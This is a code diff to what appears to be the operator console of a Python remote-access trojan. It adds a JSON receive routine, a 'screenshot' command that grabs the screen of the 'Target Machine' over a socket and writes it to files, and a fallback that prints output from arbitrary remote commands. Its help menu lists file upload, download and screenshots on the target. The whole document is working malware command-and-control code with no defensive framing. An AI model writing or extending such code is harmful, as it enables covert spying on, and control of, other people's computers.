@@ -24,6 +24,15 @@ def down_file(file):
 def data_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
+def data_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
 def t_commun():
     count = 0
     while True:
@@ -39,6 +48,19 @@ def t_commun():
             upload_file(command[7:])
         elif command [:8] == 'download':
             down_file(command[9:])
+        elif command [:10] == 'screenshot':
+            f = open('screenshot%d' % (count), 'wb')
+            target.settimeout(5)
+            chunk = target.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target.recv(1024)
+                except socket.timeout as e:
+                    break
+            target.settimeout(None)
+            f.close()
+            count += 1
         elif command == 'help':
             print(colored('''\n
                           exit: Close the session on the Target Machine.
@@ -49,6 +71,9 @@ def t_commun():
                           screenshot: Takes a screenshot from the Target Machine.
                           help: Show this Menu LMAO.
                           ''',  'grey'))
+        else:
+            answer = data_recv()
+            print(answer)
 
 
 
